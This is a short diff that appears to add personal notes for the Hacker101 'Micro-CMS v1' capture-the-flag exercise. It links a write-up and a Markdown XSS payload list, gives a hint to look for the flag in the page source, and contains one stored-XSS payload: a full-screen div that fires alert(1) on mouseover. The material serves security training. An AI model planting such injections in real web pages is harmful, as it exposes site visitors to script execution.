@@ -1,0 +1,8 @@
+https://medium.com/@ternera/hacker101-ctf-micro-cms-v1-e230c5239126
+https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt
+
+
+## check the source code for the flag after creating
+
+<div onmouseover="alert(1)" style="position:fixed;left:0;top:0;width:9999px;height:9999px;"></div>
+
